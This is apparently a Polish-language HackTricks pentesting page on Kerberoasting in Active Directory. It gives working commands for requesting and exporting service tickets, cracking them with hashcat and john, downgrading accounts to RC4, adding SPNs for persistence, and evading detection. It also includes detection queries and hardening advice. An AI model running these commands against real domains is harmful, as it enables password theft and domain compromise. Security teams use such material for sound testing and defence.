# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting koncentruje się na pozyskiwaniu biletów TGS, szczególnie tych związanych z usługami działającymi na kontach użytkowników w Active Directory (AD), z wyłączeniem kont komputerów. Szyfrowanie tych biletów wykorzystuje klucze pochodzące z haseł użytkowników, co umożliwia łamanie haseł offline. Użycie konta użytkownika jako usługi wskazuje na niepustą właściwość ServicePrincipalName (SPN).

Każdy uwierzytelniony użytkownik domeny może żądać biletów TGS, więc nie są potrzebne żadne specjalne uprawnienia.

### Kluczowe punkty

- Celuje w bilety TGS dla usług, które działają na kontach użytkowników (tj. konta z ustawionym SPN; nie konta komputerów).
- Bilety są szyfrowane kluczem pochodzącym z hasła konta usługi i mogą być łamane offline.
- Nie są wymagane podwyższone uprawnienia; każde uwierzytelnione konto może żądać biletów TGS.

> [!WARNING]
> Większość publicznych narzędzi preferuje żądanie biletów serwisowych RC4-HMAC (typ 23), ponieważ są one szybsze do złamania niż AES. Hashe TGS RC4 zaczynają się od `$krb5tgs$23$*`, AES128 od `$krb5tgs$17$*`, a AES256 od `$krb5tgs$18$*`. Jednak wiele środowisk przechodzi na wyłącznie AES. Nie zakładaj, że tylko RC4 jest istotne.
> Ponadto unikaj „spray-and-pray” roasting. Domyślny kerberoast Rubeusa może zapytywać i żądać biletów dla wszystkich SPN-ów i jest głośny. Najpierw enumeruj i celuj w interesujące zasady.

### Atak

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Narzędzia wielofunkcyjne, w tym kontrole kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Wymień użytkowników podatnych na kerberoasting
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technika 1: Poproś o TGS i zrzut z pamięci
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technika 2: Narzędzia automatyczne
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Żądanie TGS generuje zdarzenie zabezpieczeń systemu Windows 4769 (żądanie biletu usługi Kerberos).

### OPSEC i środowiska tylko z AES

- Celowo żądaj RC4 dla kont bez AES:
- Rubeus: `/rc4opsec` używa tgtdeleg do enumeracji kont bez AES i żąda biletów usługi RC4.
- Rubeus: `/tgtdeleg` z kerberoast również wyzwala żądania RC4 tam, gdzie to możliwe.
- Piecz AES-tylko konta zamiast cicho zawodzić:
- Rubeus: `/aes` enumeruje konta z włączonym AES i żąda biletów usługi AES (typ 17/18).
- Jeśli już posiadasz TGT (PTT lub z .kirbi), możesz użyć `/ticket:<blob|path>` z `/spn:<SPN>` lub `/spns:<file>` i pominąć LDAP.
- Celowanie, ograniczanie i mniej hałasu:
- Użyj `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` i `/jitter:<1-100>`.
- Filtruj prawdopodobnie słabe hasła używając `/pwdsetbefore:<MM-dd-yyyy>` (starsze hasła) lub celuj w uprzywilejowane OU z `/ou:<DN>`.

Przykłady (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Łamanie
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

Jeśli kontrolujesz lub możesz modyfikować konto, możesz uczynić je kerberoastable, dodając SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Obniż konto, aby włączyć RC4 dla łatwiejszego łamania (wymaga uprawnień do zapisu na docelowym obiekcie):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
Możesz znaleźć przydatne narzędzia do ataków kerberoast tutaj: https://github.com/nidem/kerberoast

Jeśli napotkasz ten błąd z systemu Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, jest to spowodowane różnicą czasu lokalnego. Synchronizuj z DC:

- `ntpdate <DC_IP>` (przestarzałe w niektórych dystrybucjach)
- `rdate -n <DC_IP>`

### Wykrywanie

Kerberoasting może być dyskretny. Poluj na zdarzenie ID 4769 z DC i zastosuj filtry, aby zredukować szum:

- Wyklucz nazwę usługi `krbtgt` oraz nazwy usług kończące się na `$` (konta komputerów).
- Wyklucz żądania z kont maszyn (`*$$@*`).
- Tylko udane żądania (Kod błędu `0x0`).
- Śledź typy szyfrowania: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Nie alarmuj tylko na `0x17`.

Przykład triage w PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Dodatkowe pomysły:

- Ustal normalne użycie SPN dla każdego hosta/użytkownika; alarmuj o dużych skokach liczby różnych żądań SPN z jednego głównego.
- Zgłoś nietypowe użycie RC4 w domenach wzmocnionych AES.

### Łagodzenie / Wzmocnienie

- Używaj gMSA/dMSA lub kont maszynowych dla usług. Zarządzane konta mają losowe hasła o długości 120+ znaków i automatycznie się zmieniają, co czyni łamanie offline niepraktycznym.
- Wymuś AES na kontach usługowych, ustawiając `msDS-SupportedEncryptionTypes` na tylko AES (dziesiętnie 24 / szesnastkowo 0x18), a następnie zmień hasło, aby klucze AES były pochodne.
- Tam, gdzie to możliwe, wyłącz RC4 w swoim środowisku i monitoruj próby użycia RC4. Na DC możesz użyć wartości rejestru `DefaultDomainSupportedEncTypes`, aby ustawić domyślne dla kont bez ustawionego `msDS-SupportedEncryptionTypes`. Testuj dokładnie.
- Usuń niepotrzebne SPN z kont użytkowników.
- Używaj długich, losowych haseł kont usługowych (25+ znaków), jeśli zarządzane konta nie są możliwe; zakazuj powszechnych haseł i regularnie audytuj.

### Kerberoast bez konta domenowego (ST żądane przez AS)

We wrześniu 2022 roku Charlie Clark pokazał, że jeśli główny nie wymaga wstępnej autoryzacji, możliwe jest uzyskanie biletu usługi za pomocą skonstruowanego KRB_AS_REQ, zmieniając sname w treści żądania, skutecznie uzyskując bilet usługi zamiast TGT. To odzwierciedla AS-REP roasting i nie wymaga ważnych poświadczeń domenowych.

Zobacz szczegóły: artykuł Semperis „Nowe ścieżki ataku: ST żądane przez AS”.

> [!WARNING]
> Musisz dostarczyć listę użytkowników, ponieważ bez ważnych poświadczeń nie możesz zapytać LDAP tą techniką.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Powiązane

Jeśli celujesz w użytkowników, których można poddać atakowi AS-REP, zobacz także:

{{#ref}}
asreproast.md
{{#endref}}

## Odniesienia

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- Microsoft Security Blog (2024-10-11) – Wytyczne Microsoftu w celu złagodzenia Kerberoasting: https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
- SpecterOps – Dokumentacja Rubeus Roasting: https://docs.specterops.io/ghostpack/rubeus/roasting

{{#include ../../banners/hacktricks-training.md}}
